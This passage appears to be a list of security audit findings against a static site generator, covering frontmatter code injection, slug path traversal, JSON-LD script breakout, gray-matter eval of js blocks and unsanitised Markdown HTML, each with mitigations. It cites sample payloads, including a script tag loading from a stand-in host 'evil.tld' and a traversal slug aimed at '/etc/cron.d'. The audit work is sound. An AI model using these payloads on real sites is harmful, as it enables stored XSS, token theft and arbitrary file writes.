body: src/content/loader.ts:224-225 reads `codeinjection_head` / `codeinjection_foot` as strings from frontmatter and pipes them into post.html via the `ghost_head` / `ghost_foot` helpers (src/render/helpers/ghost-head.ts:48-56) using `new SafeString(head)`. There is no allow-list and no per-post toggle. Threat: a contributor PR that adds a post with `codeinjection_foot: "<script src=//evil.tld/x.js></script>"` ships site-wide JS once merged. Impact: persistent XSS / token exfiltration / coinminer. Mitigation: gate these fields behind config (`build.allow_code_injection = false` by default), require explicit per-post opt-in, or document loudly that PRs touching these fields need extra review. The README/SECURITY.md does not currently call this out.

title: security: frontmatter `slug` allows arbitrary path traversal for output filenames
body: src/content/loader.ts:183 takes `asString(data.slug)` verbatim — no normalisation, no `slugify()`, no character whitelist. The slug then drives `outputPath = "${post.slug}/index.html"` in src/build/routes.ts:40-42, and finally `writeFile(join(outputDir, outputPath), …)` in src/build/emit.ts:7. A malicious slug like `../../../../etc/cron.d/evil` (or on Windows, `..\..\..\Users\Public\xxx`) escapes outputDir and writes attacker-controlled HTML to arbitrary filesystem locations runnable as the build user. The same applies to tags/authors via src/content/loader.ts:251 and 282 when frontmatter `slug:` is provided (the fallback path uses slugify; the explicit override does not). Mitigation: always pass user-supplied slug through `slugify(s, { strict: true, lower: true })` and assert the joined path stays under outputDir.

title: security: ghost_head emits JSON-LD with `JSON.stringify(jsonLd)` — `</script>` inside fields breaks out
body: src/render/helpers/ghost-head.ts:45 emits `<script type="application/ld+json">${JSON.stringify(jsonLd)}</script>`. JSON.stringify does *not* escape `<` or `/`, so if any field (title, description, author name, site title) contains the literal sequence `</script>`, it ends the script tag and the rest is HTML — stored XSS. Mitigation: replace `<` with `\u003c` in the serialised JSON (standard fix), e.g. `JSON.stringify(jsonLd).replace(/</g, '\\u003c')`.

title: security: gray-matter uses js-yaml with default schema (code-exec types disabled, but custom tags still parsed)
body: src/content/frontmatter.ts calls `matter(raw)` with no options, so gray-matter v4 uses js-yaml v3 in default mode. js-yaml v3 in default mode disables `!!js/function`, `!!js/regexp`, and `!!js/undefined` (those require `LOAD_FULL_SCHEMA`), so direct RCE via YAML deserialisation is blocked. However: (a) gray-matter caches parsed results by content key in a module-global, allowing memory growth across watch runs; (b) gray-matter also auto-tries the `js` engine on `---js` blocks which `eval`s JavaScript — if a contributor switches the fence to `---js ... ---` the body is `eval()`-ed in the build process. Mitigation: explicitly pass `{ engines: { yaml: (s) => yaml.load(s, { schema: yaml.FAILSAFE_SCHEMA }) }, language: 'yaml' }` and reject any non-YAML language tag. See https://github.com/jonschlinkert/gray-matter#optionsengines.

title: security: marked configured with raw HTML passthrough enables stored XSS in posts
body: src/content/markdown.ts instantiates marked with `{ gfm: true, breaks: false }` and no sanitizer. marked v14 dropped its built-in `sanitize` option, so raw HTML inside any Markdown file (`<script>`, `<iframe>`, event handlers, `javascript:` URLs) is passed verbatim into post.html and then emitted into output HTML via `{{{content}}}` / `{{{body}}}` / the `content` helper (which wraps in SafeString).
